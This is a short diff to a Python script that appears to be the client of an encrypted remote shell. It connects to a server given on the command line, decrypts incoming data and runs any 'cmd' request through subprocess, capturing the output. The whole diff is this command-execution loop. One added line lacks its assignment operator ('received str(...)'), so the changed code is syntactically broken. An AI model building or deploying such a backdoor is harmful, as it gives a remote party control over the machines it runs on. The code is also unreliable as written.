@@ -52,8 +52,11 @@ def main():
     conn.connect((args.server, args.port))
     while True:
         try:
-            received = do_decrypt(get_data(conn, buff))
-            command = [ str(x, 'utf-8') for x in received ]
+            data = get_data(conn, buff)
+            if data == 0:
+                break
+            received str(do_decrypt(data).strip(), 'utf-8')
+            command = received.split(' ')
             if 'cmd' in command:
                 del command[0]
                 output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
